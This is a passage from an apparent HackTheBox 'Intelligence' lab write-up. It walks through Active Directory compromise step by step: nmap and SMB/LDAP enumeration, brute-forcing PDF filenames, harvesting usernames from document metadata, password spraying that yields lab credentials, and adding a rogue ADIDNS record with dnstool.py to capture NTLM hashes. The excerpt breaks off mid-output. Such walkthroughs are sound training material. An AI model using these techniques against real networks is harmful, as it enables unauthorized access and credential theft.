brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs&rsquo; metadata, a valid combination is discovered. In the file shares, there&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under <code>intelligence.htb</code>. By creating a new subdomain record, it is possible to capture the requester&rsquo;s hash, which can be cracked offline. Bloodhound analysis reveals that the user has permission to read the password of a GMSA account, which has delegation rights to a service. These permissions can be exploited for privilege escalation to domain admin.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>User enumeration via file metadata</li><li>ADI DNS attack</li><li>AD</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Impacket</li><li>BloodHound</li><li>dnstool.py</li><li>gMSADumper.py</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Port scanning with <code>nmap</code> reveals a bunch of ports open. Some interesting ports to dig into here are 445, 389, and 80.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49423,49667,49691,49709,49714 -sC -sV -oA nmap/10-tcp-allport-script-intelligence 10.10.10.248
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-07-14 00:22 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.248
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.30s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp    open  domain        Simple DNS Plus
</span></span><span class=line><span class=cl>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Intelligence
</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2021-07-14 11:22:29Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>dc.intelligence.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class=p>;</span> +7h00m03s from scanner time.
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>dc.intelligence.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class=p>;</span> +7h00m02s from scanner time.
</span></span><span class=line><span class=cl>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>dc.intelligence.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class=p>;</span> +7h00m03s from scanner time.
</span></span><span class=line><span class=cl>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>dc.intelligence.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class=p>;</span> +7h00m02s from scanner time.
</span></span><span class=line><span class=cl>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class=line><span class=cl>49423/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>49709/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49714/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>Service Info: Host: DC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2021-07-14T11:23:25
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 104.01 seconds
</span></span></code></pre></div><p><code>Nmap</code> results also reveal the some domain names. I&rsquo;ll add these to my <code>/etc/hosts</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>10.10.10.248 dc.intelligence.htb intelligence.htb
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-445---smb>TCP 445 - SMB<a class=anchor aria-hidden=true href=#tcp-445---smb>#</a></h3><p>When approaching an AD box, I would definitely check for anonymous login on SMB.</p><p>It&rsquo;s allowed but nothing to see here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ smbclient -N -L //10.10.10.248/
</span></span><span class=line><span class=cl>Anonymous login successful
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Sharename       Type      Comment
</span></span><span class=line><span class=cl>        ---------       ----      -------
</span></span><span class=line><span class=cl>SMB1 disabled -- no workgroup available
</span></span></code></pre></div><h3 id=tcp-389---ldap>TCP 389 - LDAP<a class=anchor aria-hidden=true href=#tcp-389---ldap>#</a></h3><p>On LDAP, I can only retrieve the naming contexts.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ ldapsearch -LLL -x -h 10.10.10.248 -s base namingContexts
</span></span><span class=line><span class=cl>dn:
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>DC</span><span class=o>=</span>intelligence,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>CN</span><span class=o>=</span>Configuration,DC<span class=o>=</span>intelligence,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>CN</span><span class=o>=</span>Schema,CN<span class=o>=</span>Configuration,DC<span class=o>=</span>intelligence,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>DC</span><span class=o>=</span>DomainDnsZones,DC<span class=o>=</span>intelligence,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>namingContexts: <span class=nv>DC</span><span class=o>=</span>ForestDnsZones,DC<span class=o>=</span>intelligence,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ ldapsearch -LLL -x -h 10.10.10.248 -b <span class=s2>&#34;dc=intelligence,dc=htb&#34;</span>
</span></span><span class=line><span class=cl>Operations error <span class=o>(</span>1<span class=o>)</span>
</span></span><span class=line><span class=cl>Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful <span class=nb>bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>The website hosted on this machine is a static site with no further information to dig in.</p><p><div class=img-container><img src=imgs/image-20210714112254614.png alt=image-20210714112254614></div></p><p>In the next section, there are two download buttons.</p><p><div class=img-container><img src=imgs/image-20210714112325301.png alt=image-20210714112325301></div></p><p>These buttons point to two PDF files. The file contents don&rsquo;t seem to be important, but in each document&rsquo;s properties there&rsquo;s a potential username.</p><p>PDF 1: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p><p><div class=img-container><img src=imgs/image-20210714113015135.png alt=image-20210714113015135></div></p><p>PDF 2: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p><p><div class=img-container><img src=imgs/image-20210714113121646.png alt=image-20210714113121646></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=access-as-tifannymolina>Access as Tifanny.Molina<a class=anchor aria-hidden=true href=#access-as-tifannymolina>#</a></h3><h4 id=grabbing-more-pdfs>Grabbing more PDFs<a class=anchor aria-hidden=true href=#grabbing-more-pdfs>#</a></h4><p>Seeing the filename with pattern <code>YYYY-MM-DD</code> eventually led me to think &ldquo;Will incrementing the date give me another pdf?&rdquo;.</p><p>The answer is yes, it does!</p><p><div class=img-container><img src=imgs/image-20210716081606506.png alt=image-20210716081606506></div></p><p>From here, I&rsquo;ll write a script to brute-force the other PDFs with <code>YYYY-MM-DD</code> timestamp pattern.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>for</span> month in <span class=o>{</span>01..12<span class=o>}</span>
</span></span><span class=line><span class=cl> <span class=k>do</span> 
</span></span><span class=line><span class=cl>  <span class=k>for</span> day in <span class=o>{</span>01..31<span class=o>}</span>
</span></span><span class=line><span class=cl>  <span class=k>do</span>
</span></span><span class=line><span class=cl>     wget -q <span class=s2>&#34;http://10.10.10.248/documents/2020-</span><span class=nv>$month</span><span class=s2>-</span><span class=nv>$day</span><span class=s2>-upload.pdf&#34;</span> 2&gt;/dev/null
</span></span><span class=line><span class=cl>  <span class=k>done</span>
</span></span><span class=line><span class=cl> <span class=k>done</span>
</span></span></code></pre></div><p>And here&rsquo;s what I got.</p><p><div class=img-container><img src=imgs/image-20210716083456661.png alt=image-20210716083456661></div></p><p>Alternatively, I can use <code>wget</code> with brace expansion:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ wget -q http://10.10.10.248/documents/2020-<span class=o>{</span>01..12<span class=o>}</span>-<span class=o>{</span>01..31<span class=o>}</span>-upload.pdf
</span></span></code></pre></div><h4 id=harvest-username-via-pdf-metadata>Harvest Username via PDF Metadata<a class=anchor aria-hidden=true href=#harvest-username-via-pdf-metadata>#</a></h4><p>It&rsquo;s possible to harvest the creator name from the metadata to make a list of usernames.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «loot» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ exiftool * <span class=p>|</span> grep -i creator <span class=p>|</span> cut -d <span class=s1>&#39;:&#39;</span> -f2 <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span> -f2 <span class=p>|</span> sort <span class=p>|</span> uniq <span class=p>|</span> tee ../users.list 
</span></span><span class=line><span class=cl>Anita.Roberts
</span></span><span class=line><span class=cl>Brian.Baker
</span></span><span class=line><span class=cl>Brian.Morris
</span></span><span class=line><span class=cl>Daniel.Shelton
</span></span><span class=line><span class=cl>Danny.Matthews
</span></span><span class=line><span class=cl>Darryl.Harris
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>The first idea to come with the username list is to perform <a href=https://fahmifj.github.io/hackthebox/forest/#asrep-roasting>AS-REP Roasting</a> attack. I&rsquo;ve tried it but no luck there.</p><h4 id=pdf-content-examination>PDF Content Examination<a class=anchor aria-hidden=true href=#pdf-content-examination>#</a></h4><p>I discovered two non-<em>Lorem Ipsum</em> files by manually examining the PDF contents.</p><p>The first one is <code>2020-06-04-upload.pdf</code>, it contains the default password for new accounts in Intelligence Corp.</p><p><div class=img-container><img src=imgs/image-20210716090147601.png alt=image-20210716090147601></div></p><p>The second one is <code>2020-06-04-upload.pdf</code>, it contains some internal information that will be useful later.</p><p><div class=img-container><img src=imgs/image-20210716084253574.png alt=image-20210716084253574></div></p><h4 id=password-spray>Password Spray<a class=anchor aria-hidden=true href=#password-spray>#</a></h4><p>From here, I can spray the password to the username list I have harvested earlier via <code>rpcclient</code>. This attack returns one valid pair <code>Tiffany.Molina:NewIntelligenceCorpUser9876</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class=line><span class=cl>$ rpcspray users.list password.list 10.10.10.248 <span class=p>|</span> grep -v <span class=s1>&#39;NT_STATUS_LOGON_FAILURE&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying: <span class=s1>&#39;Anita.Roberts:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying: <span class=s1>&#39;Brian.Baker:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying: <span class=s1>&#39;Brian.Morris:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying: <span class=s1>&#39;Tiffany.Molina:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class=line><span class=cl>Account Name: Tiffany.Molina, Authority Name: intelligence
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying: <span class=s1>&#39;Travis.Evans:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying: <span class=s1>&#39;Veronica.Patel:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying: <span class=s1>&#39;William.Lee:NewIntelligenceCorpUser9876&#39;</span> 
</span></span></code></pre></div><h4 id=smb-revisit>SMB Revisit<a class=anchor aria-hidden=true href=#smb-revisit>#</a></h4><p>Enumerating SMB with <code>smbmap</code> now returns a list of shares that are accessible by Tifanny.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class=line><span class=cl>$ smbmap -H 10.10.10.248 -u <span class=s1>&#39;Tiffany.Molina&#39;</span> -p <span class=s1>&#39;NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
</span></span><span class=line><span class=cl>        Disk                                                    Permissions     Comment
</span></span><span class=line><span class=cl>        ----                                                    -----------     -------
</span></span><span class=line><span class=cl>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class=line><span class=cl>        C$                                                      NO ACCESS       Default share
</span></span><span class=line><span class=cl>        IPC$                                                    READ ONLY       Remote IPC
</span></span><span class=line><span class=cl>        IT                                                      READ ONLY
</span></span><span class=line><span class=cl>        NETLOGON                                                READ ONLY       Logon server share 
</span></span><span class=line><span class=cl>        SYSVOL                                                  READ ONLY       Logon server share 
</span></span><span class=line><span class=cl>        Users                                                   READ ONLY
</span></span></code></pre></div><p>It turns out I can read the flag from the <code>Users</code> share.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ smbclient //intelligence.htb/Users -U <span class=s1>&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls Tiffany.Molina<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>  .                                  DR        <span class=m>0</span>  Sun Apr <span class=m>18</span> 20:51:46 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ..                                 DR        <span class=m>0</span>  Sun Apr <span class=m>18</span> 20:51:46 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  user.txt                           AR       <span class=m>34</span>  Thu Jul <span class=m>15</span> 08:17:40 <span class=m>2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=m>3770367</span> blocks of size 4096. <span class=m>1444029</span> blocks available
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=access-as-tedgraves>Access as Ted.Graves<a class=anchor aria-hidden=true href=#access-as-tedgraves>#</a></h3><h4 id=it-share>IT share<a class=anchor aria-hidden=true href=#it-share>#</a></h4><p>On the <code>IT</code> share, there is a PowerShell script called <code>downdetector.ps1</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ smbclient //intelligence.htb/IT -U <span class=s1>&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Sun Apr <span class=m>18</span> 20:50:55 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Sun Apr <span class=m>18</span> 20:50:55 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  downdetector.ps1                    A     <span class=m>1046</span>  Sun Apr <span class=m>18</span> 20:50:55 <span class=m>2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=m>3770367</span> blocks of size 4096. <span class=m>1444112</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> mget downdetector.ps1 
</span></span><span class=line><span class=cl>Get file downdetector.ps1? y
</span></span><span class=line><span class=cl>getting file <span class=se>\d</span>owndetector.ps1 of size <span class=m>1046</span> as downdetector.ps1 <span class=o>(</span>0.6 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0.6 KiloBytes/sec<span class=o>)</span>
</span></span></code></pre></div><p>According to the comment it is said that this script is used to check web server status.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Check web server status. Scheduled to run every 5min</span>
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=n>ActiveDirectory</span> 
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$record</span> <span class=k>in</span> <span class=nb>Get-ChildItem</span> <span class=s2>&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=n>Name</span> <span class=o>-like</span> <span class=s2>&#34;web*&#34;</span><span class=p>)</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$request</span> <span class=p>=</span> <span class=nb>Invoke-WebRequest</span> <span class=n>-Uri</span> <span class=s2>&#34;http://</span><span class=p>$(</span><span class=nv>$record</span><span class=p>.</span><span class=n>Name</span><span class=p>)</span><span class=s2>&#34;</span> <span class=n>-UseDefaultCredentials</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(.</span><span class=py>StatusCode</span> <span class=o>-ne</span> <span class=mf>200</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nb>Send-MailMessage</span> <span class=n>-From</span> <span class=s1>&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class=n>-To</span> <span class=s1>&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class=n>-Subject</span> <span class=s2>&#34;Host: </span><span class=p>$(</span><span class=nv>$record</span><span class=p>.</span><span class=n>Name</span><span class=p>)</span><span class=s2> is down&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>If I re-query this line <code>DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb</code> with a filter of <code>name=web*</code> using <code>ldapsearch</code>, it returns the following record.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ ldapsearch -LLL -D <span class=s1>&#39;Tiffany.Molina@intelligence.htb&#39;</span> -w <span class=s1>&#39;NewIntelligenceCorpUser9876&#39;</span> -x -h 10.10.10.248 -b <span class=s2>&#34;DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class=s2>&#34;name=web*&#34;</span>
</span></span><span class=line><span class=cl>dn: <span class=nv>DC</span><span class=o>=</span>weboops,DC<span class=o>=</span>intelligence.htb,CN<span class=o>=</span>MicrosoftDNS,DC<span class=o>=</span>DomainDnsZones,DC<span class=o>=</span>intell
</span></span><span class=line><span class=cl> igence,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: dnsNode
</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>DC</span><span class=o>=</span>weboops,DC<span class=o>=</span>intelligence.htb,CN<span class=o>=</span>MicrosoftDNS,DC<span class=o>=</span>DomainDns
</span></span><span class=line><span class=cl> Zones,DC<span class=o>=</span>intelligence,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>instanceType: <span class=m>4</span>
</span></span><span class=line><span class=cl>whenCreated: 20210716071327.0Z
</span></span><span class=line><span class=cl>whenChanged: 20210716071707.0Z
</span></span><span class=line><span class=cl>uSNCreated: <span class=m>102869</span>
</span></span><span class=line><span class=cl>uSNChanged: <span class=m>102872</span>
</span></span><span class=line><span class=cl>showInAdvancedViewOnly: TRUE
</span></span><span class=line><span class=cl>name: weboops
</span></span><span class=line><span class=cl>objectGUID:: JGYq3NUoGU24w9fR4hg/6Q<span class=o>==</span>
</span></span><span class=line><span class=cl>dnsRecord:: <span class=nv>CAAAAAUAAABMAAAAAAAAAAAAAAAAAAAA9mT1lRJ61wE</span><span class=o>=</span>
</span></span><span class=line><span class=cl>objectCategory: <span class=nv>CN</span><span class=o>=</span>Dns-Node,CN<span class=o>=</span>Schema,CN<span class=o>=</span>Configuration,DC<span class=o>=</span>intelligence,DC<span class=o>=</span>htb
</span></span><span class=line><span class=cl>dSCorePropagationData: 16010101000000.0Z
</span></span><span class=line><span class=cl>dNSTombstoned: TRUE
</span></span><span class=line><span class=cl>dc: weboops
</span></span></code></pre></div><p>So the script basically looks for DNS records that begin with <code>web*</code>. For each discovered record, it performs an HTTP request to check if the record is active. And if the response code is not 200, the script sends an email notification to Ted Graves.</p><p>The key take away here is the wildcard (<code>*</code>).</p><h4 id=stealing-ntlmv2-response-via-adidns>Stealing NTLMv2 Response via ADIDNS<a class=anchor aria-hidden=true href=#stealing-ntlmv2-response-via-adidns>#</a></h4><p>According to <a href=https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/>this blog</a>, in Active Directory (AD), it&rsquo;s the default behavior that any authenticated user can create a new DNS record (ADIDNS). By knowing how the previous script works, it is possible to abuse this feature.</p><p>Here&rsquo;s the concept: I attempted to create a DNS record (subdomain) under the <code>intelligence.htb</code> that begins with &lsquo;web*&rsquo;. The purpose was to have the script encounter the record I created during its next execution. This way, it would trigger NTLM authentication as the <code>Invoke-WebRequest</code> command was used with the <code>-UseDefaultCredentials</code> flag.</p><p>A well-known security researcher, <a href=https://dirkjanm.io/>Dirk-jan</a>, has developed a handy tool called <code>dnstool.py</code> specifically designed for interacting with ADIDNS. This tool is included in the <code>Krbrelayx</code> repository, so I&rsquo;ll simply clone the repository onto my machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «/opt» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ git clone https://github.com/dirkjanm/krbrelayx.git <span class=o>&amp;&amp;</span> <span class=nb>cd</span> krbrelayx
</span></span><span class=line><span class=cl>Cloning into <span class=s1>&#39;krbrelayx&#39;</span>...
</span></span><span class=line><span class=cl>remote: Enumerating objects: 98, <span class=k>done</span>.
</span></span><span class=line><span class=cl>remote: Total <span class=m>98</span> <span class=o>(</span>delta 0<span class=o>)</span>, reused <span class=m>0</span> <span class=o>(</span>delta 0<span class=o>)</span>, pack-reused <span class=m>98</span>
</span></span><span class=line><span class=cl>Receiving objects: 100% <span class=o>(</span>98/98<span class=o>)</span>, 65.76 KiB <span class=p>|</span> 426.00 KiB/s, <span class=k>done</span>.
</span></span><span class=line><span class=cl>Resolving deltas: 100% <span class=o>(</span>48/48<span class=o>)</span>, <span class=k>done</span>.
</span></span></code></pre></div><p>Now I can use the tool to add a new ADIDNS record. This record points to my machine IP.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «krbrelayx» «10.10.14.75» git:<span class=o>(</span>master<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ python3 dnstool.py -u intelligence.htb<span class=se>\\</span>Tiffany.Molina -p <span class=s1>&#39;NewIntelligenceCorpUser9876&#39;</span> -r <span class=s1>&#39;web-iamf.intelligence.htb&#39;</span> -a add -d 10.10.14.75 10.10.10.248 
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Connecting to host...
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Binding to host
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Bind OK
</span></span><span class=line><span class=cl>/opt/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve<span class=o>()</span> instead
